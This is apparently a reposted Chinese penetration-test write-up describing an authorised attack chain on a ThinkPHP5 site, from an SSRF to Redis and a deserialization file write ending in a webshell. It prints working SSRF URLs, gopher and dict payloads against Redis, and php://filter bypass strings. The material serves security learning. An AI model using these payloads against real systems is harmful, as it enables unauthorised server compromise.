> 原文链接: https://www.anquanke.com//post/id/202966 


# 一次“SSRF--&gt;RCE”的艰难利用


                                阅读量   
                                **399662**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01e753d12718679029.png)](https://p2.ssl.qhimg.com/t01e753d12718679029.png)

> 乐清小俊杰@Pentes7eam

## 前言

一次授权的渗透测试中，发现一处SSRF漏洞，可结合Redis实现RCE，看似近在咫尺，却又满路荆棘，经过不懈努力，最终达成目的。其中有几处比较有意思的地方，抽象出来与大家分享。



## 发现SSRF

目标站点使用ThinkPHP5框架开发，互联网可直接下载源代码，通过代码审计发现一处SSRF漏洞，代码如下所示：

```
public function httpGet($url="")`{`

        $curl = curl_init();

        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_TIMEOUT, 8);
        //curl_setopt($curl, CURLOPT_TIMEOUT_MS, 1);
        curl_setopt($curl, CURLOPT_URL, $url);

        $res = curl_exec($curl);
        curl_close($curl);

        return $res;
    `}`
```

利用SSRF漏洞读取ThinkPHP5配置文件：[http://domain.com/public/index.php?s=index/test/httpget&amp;url=file:////var/www/html/tp_5.0.24/application/config.php](http://domain.com/public/index.php?s=index/test/httpget&amp;url=file:////var/www/html/tp_5.0.24/application/config.php)

[![](https://p2.ssl.qhimg.com/dm/1024_267_/t01b2e116349c7a0113.png)](https://p2.ssl.qhimg.com/dm/1024_267_/t01b2e116349c7a0113.png)

如上图所示，目标业务系统采用Redis缓存数据，且密码为空。

利用gopher协议尝试获取info信息：

[http://domain.com/public/index.php?s=index/test/httpget&amp;url=gopher://127.0.0.1:6379/_info](http://domain.com/public/index.php?s=index/test/httpget&amp;url=gopher://127.0.0.1:6379/_info)

发现无回显，一段时间后500错误，疑似连接上后超时退出,原因不明（后期复盘时推测为疑似开启了php短标签导致语法错误）

[![](https://p1.ssl.qhimg.com/dm/1024_377_/t011c6965db2f49a169.png)](https://p1.ssl.qhimg.com/dm/1024_377_/t011c6965db2f49a169.png)

尝试利用dict协议，成功获取Redis的info信息

[http://domain.com/public/index.php?s=index/test/httpget&amp;url=dict://127.0.0.1:6379/info](http://domain.com/public/index.php?s=index/test/httpget&amp;url=dict://127.0.0.1:6379/info)

[![](https://p5.ssl.qhimg.com/dm/1024_457_/t0150cb9032ad929b60.png)](https://p5.ssl.qhimg.com/dm/1024_457_/t0150cb9032ad929b60.png)



## 尝试Redis 写Shell

上述信息中显示，Redis服务的PID 为3517，查看/proc/3517/status文件。

其Redis服务用户权限为Redis

而目标Web服务器为Nginx，其用户权限为www-data，故利用Redis写shell，执行flushall操作后可能无法直接还原数据，需要通过本地提权获得ROOT用户。由于存在不确定性，故对于本次渗透测试场景下此方法不可取。

利用Redis dbfilename写shell过程发现写入后门时

[dict://127.0.0.1:6379/set](dict://127.0.0.1:6379/set) d ‘&lt;?php phpinfo();?&gt;’

无法使用“?”符号，如下图所示

[![](https://p4.ssl.qhimg.com/dm/1024_425_/t0139137ef2e7993639.png)](https://p4.ssl.qhimg.com/dm/1024_425_/t0139137ef2e7993639.png)

翻阅Redis文档，发现可以使用bitop命令

bitop知识相关链接地址为：[https://redis.io/commands/bitop](https://redis.io/commands/bitop)，该命令可以对Redis缓存值按位计算并获取结果保存，如下图所示：

[![](https://p4.ssl.qhimg.com/dm/1024_578_/t01ce3c2da9757130ff.png)](https://p4.ssl.qhimg.com/dm/1024_578_/t01ce3c2da9757130ff.png)

执行save操作后访问目标发现回显500错误，猜测原因可能如下：
<li data-darkmode-color-158683391660910="rgb(230, 230, 230)" data-darkmode-original-color-158683391660910="rgb(0, 0, 0)" data-style="box-sizing: border-box; margin: 0px; font-size: 14px; color: rgb(0, 0, 0);">
目标redis数据过大(目标存在10w+ keys)，导致超过PHP 执行文件大小；
</li>
<li data-darkmode-color-158683391660910="rgb(230, 230, 230)" data-darkmode-original-color-158683391660910="rgb(0, 0, 0)" data-style="box-sizing: border-box; margin: 0px; font-size: 14px; color: rgb(0, 0, 0);">
可能是数据中存在与PHP代码相似数据，解析出现语法错误，导致无法执行。
</li>


## 尝利用ThinkPHP反序列化

查看ThinkPHP的Redis的获取数据代码，发现如果值以think_serialize:开头就可以触发反序列化。

[![](https://p1.ssl.qhimg.com/dm/1024_460_/t0161f419705292b153.png)](https://p1.ssl.qhimg.com/dm/1024_460_/t0161f419705292b153.png)

目标ThinkPHP的版本为 5.0.24，该版本存在已知反序列化写文件漏洞，相关漏洞细节链接：[http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/](http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/)。采用该链接中的漏洞利用代码，直接生成的反序列化数据如下(数据前加上了think_serialize:)

[![](https://p5.ssl.qhimg.com/dm/1024_184_/t014afe6b9a37e674ad.png)](https://p5.ssl.qhimg.com/dm/1024_184_/t014afe6b9a37e674ad.png)

测试发现由于反序列化数据流中存在\x00,导致程序报错，如下图所示：

[![](https://p4.ssl.qhimg.com/dm/1024_220_/t015205eb9d048f31d8.png)](https://p4.ssl.qhimg.com/dm/1024_220_/t015205eb9d048f31d8.png)

测试发现反序列化数据流中存在“ : ” 符号,dict协议无法传输。

[![](https://p3.ssl.qhimg.com/dm/1024_246_/t01497da11b69a8cb0b.png)](https://p3.ssl.qhimg.com/dm/1024_246_/t01497da11b69a8cb0b.png)

结合bitop not命令，先对数据进行取反，进入redis后，再取反，得到真正的反序列化数据。过程下图所示。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_649_/t01843e2d48c9b5e6e3.png)

至此，只要访问代码中触发缓存的点即可触发ThinkPHP5反序列化。



## 修改反序列化利用代码

ThinkPHP反序列化漏洞最终的写入点为

```
file_put_contents($a,'&lt;?php  exit();'.$a)
```

需要使用[php://filter](php://filter)协议来绕过，原有漏洞利用代码:

[php://filter/write=string.rot13/resource=xx](php://filter/write=string.rot13/resource=xx)&lt;?php使用的rot13反转，虽然绕过了exit();但是会导致输出文件出现&lt;?cur 如下图所示

[![](https://p2.ssl.qhimg.com/dm/1024_474_/t0121d0ccae76b9120a.png)](https://p2.ssl.qhimg.com/dm/1024_474_/t0121d0ccae76b9120a.png)

经测试目标返回500，推测是开启了php短标签导致语法错误，这估计也是前面Redis写shell出现 500状态码的原因。

经过大量尝试，最终发现使用[php://filter//convert.iconv.UCS-4LE.UCS-4BE/resource=abcd](php://filter//convert.iconv.UCS-4LE.UCS-4BE/resource=abcd)该iconv.UCS-4LE.UCS-4BE 函数会将目标4位一反转,从而绕过短标签。

[![](https://p5.ssl.qhimg.com/dm/1024_237_/t01a0951a32cbdef67d.png)](https://p5.ssl.qhimg.com/dm/1024_237_/t01a0951a32cbdef67d.png)

[![](https://p0.ssl.qhimg.com/dm/1024_369_/t0175238782605ee6fb.png)](https://p0.ssl.qhimg.com/dm/1024_369_/t0175238782605ee6fb.png)

但测试发现目标关键文件始终为空，而本地却可以生成。测试使用写入数据为aaaa仍为空。图为本地生成的关键文件

[![](https://p1.ssl.qhimg.com/dm/1024_113_/t01c21fb0fa77867ef2.png)](https://p1.ssl.qhimg.com/dm/1024_113_/t01c21fb0fa77867ef2.png)

猜测目标开启了php strict模式，关键文件的总字符数不能被4整除(除后余2，如果添加2字符，则写入数据不能正常显示为shell)导致写入为空。

最后尝试[php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=xxxx](php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=xxxx)成功getshell。iconv.UCS-2LE.UCS-2BE为2位一反转。



## gopher协议再验证

重新测试gopher协议。最后发现gopher协议会自动url解码一次。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_283_/t0141a69cebc9695445.png)

通过nc 对比gopher和dict协议后发现，dict会自动加上quit命令 XD

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_422_/t01b9d68b1640048fab.png)

于是成功让gopher有回显，url=[gopher://127.0.0.1:6379/_set](gopher://127.0.0.1:6379/_set) key aa%253abbcc%250d%250aquit如下图所示：

[![](https://p3.ssl.qhimg.com/dm/1024_235_/t01d6963695311713ba.png)](https://p3.ssl.qhimg.com/dm/1024_235_/t01d6963695311713ba.png)

但是使用url=[gopher://127.0.0.1:6379/_set](gopher://127.0.0.1:6379/_set) key aa%2500bbcc%250d%250aquit时，仍然超时，猜测可能被截断，但是对比nc数据包发现和发送数据一致。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_105_/t01197abe96bb2cf037.png)

尝试将数据包直接导入redis

[![](https://p3.ssl.qhimg.com/dm/1024_330_/t01a31706d49cc81afb.png)](https://p3.ssl.qhimg.com/dm/1024_330_/t01a31706d49cc81afb.png)

发现并没有修改成功，尝试导入redis-cli

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_293_/t018972e41662c3a20f.png)

修改成aa？那么真相只有一个 -&gt; 我是菜鸡

redis-cli 的命令会被转化。如下图所示：

[![](https://p3.ssl.qhimg.com/dm/1024_233_/t016a15df6f6df09348.png)](https://p3.ssl.qhimg.com/dm/1024_233_/t016a15df6f6df09348.png)

于是使用如上图的方式即可传入\x00字符：

```
url=gopher://127.0.0.1:6379/_*3%250d%250a$3%250d%250aset%250d%250a$3%250d%250akey%250d%250a$4%250d%250aaa%2500a%250d%250aquit
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_305_/t018b36f0f728e82556.png)



## 其他

经测试也可以使用 Redis bitfield命令（相关命令说明链接：[https://redis.io/commands/bitfield)](https://redis.io/commands/bitfield))来快速设置字符:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_198_/t01d69966bf94590d96.png)
